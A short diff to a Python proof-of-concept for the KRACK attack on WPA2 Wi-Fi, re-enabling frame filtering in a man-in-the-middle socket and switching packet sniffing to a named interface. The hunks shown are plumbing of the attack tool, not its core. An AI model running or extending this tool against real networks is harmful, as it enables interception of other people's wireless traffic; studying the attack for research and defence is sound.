@@ -106,13 +106,13 @@ class MitmSocket(L2Socket):
 
 	def recv(self, x=MTU):
 		p = L2Socket.recv(self, x)
-		# if p == None or not Dot11 in p: return None
+		if p == None or not Dot11 in p: return None
 		# if self.pcap: self.pcap.write(p)
 		
 		# Don't care about control frames
-		# if p.type == 1:
-		# 	log(ALL, "%s: ignoring control frame %s" % (self.iface, dot11_to_str(p)))
-		# 	return None
+		if p.type == 1:
+			log(ALL, "%s: ignoring control frame %s" % (self.iface, dot11_to_str(p)))
+			return None
 
 		# 1. Radiotap monitor mode header is defined in ieee80211_add_tx_radiotap_header: TX_FLAGS, DATA_RETRIES, [RATE, MCS, VHT, ]
 		# 2. Radiotap header for normal received frames is defined in ieee80211_add_rx_radiotap_header: FLAGS, CHANNEL, RX_FLAGS, [...]
@@ -499,7 +499,7 @@ class KRAckAttack():
 		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
 	def find_beacon(self, ssid):
-		ps = sniff(count=1, timeout=0.5, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid,opened_socket=self.sock_real) # opened_socket=self.sock_real iface=self.nic_real
+		ps = sniff(count=1, timeout=0.5, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid,iface=self.nic_real) # opened_socket=self.sock_real iface=self.nic_real
 		print('505: ', end='')
 		print(ps)
 		if ps is None or len(ps) < 1:
@@ -507,7 +507,7 @@ class KRAckAttack():
 			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
 				self.sock_real.set_channel(chan)
 				log(DEBUG, "Listening on channel %d" % chan)
-				ps = sniff(count=1, timeout=0.5, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # , opened_socket=self.sock_real
+				ps = sniff(count=1, timeout=0.5, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # , opened_socket=self.sock_real
 				if ps and len(ps) >= 1: break
 
 		if ps and len(ps) >= 1:
